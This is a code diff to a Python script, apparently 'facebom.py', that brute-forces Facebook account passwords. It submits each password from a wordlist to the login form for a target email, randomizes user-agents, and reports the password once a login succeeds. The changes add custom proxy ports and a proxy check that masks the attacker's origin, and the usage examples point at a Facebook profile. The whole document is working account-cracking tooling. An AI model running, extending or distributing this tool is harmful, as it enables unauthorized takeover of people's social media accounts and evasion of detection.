@@ -10,9 +10,9 @@ try:
  ##--------------------- Import Libraries --------------------##
  import socket,time,os,optparse,mechanize,random,re,requests  ##
  ##-----------------------------------------------------------##
-except ImportError,e:
-        e = e[0][16:]
-        print("[!] ImportError: ["+e+"] Module Is Missed \n[*] Please Install it Using this command> [ pip install "+e+" ]")
+except ImportError as e:
+        module = e.message[16:]
+        print("[!] ImportError: ["+module+"] Module Is Missed \n[*] Please Install it Using this command> [ pip install "+module+" ]")
         exit(1)
 os.system("cls||clear")
 
@@ -36,17 +36,15 @@ def cnet():                                       #
 ###################################################
 
 #### Check Proxy ####
-def cpro(ip):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        s.settimeout(5)
-        s.connect((ip, 8080))
-        s.close()
-        return True
-    except socket.error:
-        pass
-    return False
-
+def cpro(ip,port=None):
+	proxy = 'https://{}:8080'.format(ip) if port ==None else 'https://{}:{}'.format(ip,port)
+	proxies = {'http': proxy, 'https': proxy}
+	try:
+		r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5)
+		return_proxy = r.headers['X-Client-IP']
+		if ip==return_proxy: return True
+		else : return False
+	except Exception : return False
 #### Choice Random User-Agent ####
 def useragent():
     useragents = [
@@ -83,27 +81,31 @@ def FBOM(username, wordlist, proxy=None):
         print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" No Such File: [ "+rd+str(wordlist)+yl+" ] "+rd+"!!!"+wi)
         exit(1)
     if proxy !=None:
-        print(wi+"["+yl+"~"+wi+"] Checking "+yl+"HTTPS "+wi+"Proxy[ {}:8080 ]...".format(proxy if ":" not in proxy else proxy.split(":")[0]))
+        print(wi+"["+yl+"~"+wi+"] Connecting To "+wi+"Proxy[\033[1;33m {} \033[1;37m]...".format(proxy if ":" not in proxy else proxy.split(":")[0]))
         if ":" not in proxy:
             if proxy.count(".") ==3:
                 if cpro(proxy) == True:
                     print(wi+"["+gr+"Connected"+wi+"]")
                     useproxy = proxy+":8080"
                 else:
-                    print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
-                    useproxy = False
-                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTPS Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
-                    exit(1)
+                	if cpro(proxy, port=80) ==True:
+                		print(wi+"["+gr+"Connected"+wi+"]")
+                		useproxy = proxy+":80"
+                	else:
+                		print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
+                		useproxy = False
+                		print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTPS Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
+                		exit(1)
             else:
                 useproxy = False
                 print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+"Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                 exit(1)
         else:
-            proxy = proxy.split(":")[0]
+            proxy,port = proxy.split(":")[0],proxy.split(":")[1]
             if proxy.count(".") ==3:
-                if cpro(proxy) == True:
+                if cpro(proxy, port=port) == True:
                     print(wi+"["+gr+"Connected"+wi+"]")
-                    useproxy = proxy+":8080"
+                    useproxy = proxy+":"+port
                 else:
                     print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
                     useproxy = False
@@ -136,7 +138,7 @@ def FBOM(username, wordlist, proxy=None):
     br=mechanize.Browser()
     br.set_handle_robots(False)
     if useproxy !=False:
-        br.set_proxies({'https':useproxy})
+        br.set_proxies({'http':useproxy, 'https:':useproxy})
     user_agent = useragent()
     br.addheaders=[('User-agent',user_agent)]
     wfile = open(wordlist, "r")
@@ -150,8 +152,7 @@ def FBOM(username, wordlist, proxy=None):
             br.form["email"]=username
             br.form["pass"]=passwd
             br.method="POST"
-            res = br.submit().get_data()
-            if "home_icon" in res:
+            if "home_icon" in br.submit().get_data():
                 print(wi+"==> Login"+gr+" Success\n")
                 print(wi+"========================="+"="*len(passwd))
                 print(wi+"["+gr+"+"+wi+"] Password "+gr+"Found:"+wi+">>>>[ "+gr+"{}".format(passwd))
@@ -201,7 +202,6 @@ Examples:
      | python facebom.py -g https://www.facebook.com/alanwalker97 
      |-------- 
 """)
-
 def Main():
    parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
       help="Specify Target Email ")
